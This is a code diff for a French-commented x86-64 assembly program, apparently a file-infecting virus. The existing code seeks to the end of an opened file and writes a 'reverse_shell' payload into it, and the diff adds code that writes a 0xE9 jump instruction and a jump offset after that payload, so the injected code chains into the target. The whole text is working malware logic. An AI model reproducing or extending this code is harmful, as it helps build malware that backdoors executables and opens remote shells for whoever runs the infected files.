@@ -26,6 +26,15 @@ section .data
     taille_exagereted dq 0x1000
 
 
+    jump_insctruction db 0xe9
+    ;tmp
+    jump_offset dd -0x000BC02c42
+
+;
+;
+;0xc000046
+
+
 
 section .bss
     buffer resb 2000      ; Buffer pour stocker les données lues
@@ -310,14 +319,45 @@ mov r15, buffer
     mov rax, 8          
     mov rdi, [file_descriptor]
     mov rsi, 0 
-    mov rdx, 2        
+    mov rdx, 2        ; fin du fichier 
     syscall  
 
     mov rax, 1         
     mov rdi, [file_descriptor]       
     mov rsi, reverse_shell  
     mov rdx, reverse_shell_len
-    syscall             
+    syscall      
+
+;=============================================================
+; =============== Ajout instruction de saut  =================
+
+    mov rax, 8          
+    mov rdi, [file_descriptor]
+    mov rsi, 0 
+    mov rdx, 2        ; fin du fichier 
+    syscall  
+
+    mov rax, 1         
+    mov rdi, [file_descriptor]       
+    mov rsi, jump_insctruction  
+    mov rdx, 1
+    syscall    
+
+
+; =============== Ajout offset a sauter  =================
+
+    mov rax, 8          
+    mov rdi, [file_descriptor]
+    mov rsi, 0 
+    mov rdx, 2        ; fin du fichier 
+    syscall  
+
+    mov rax, 1         
+    mov rdi, [file_descriptor]       
+    mov rsi, jump_offset 
+    mov rdx, 4
+    syscall
+      
 
 
 sortie:
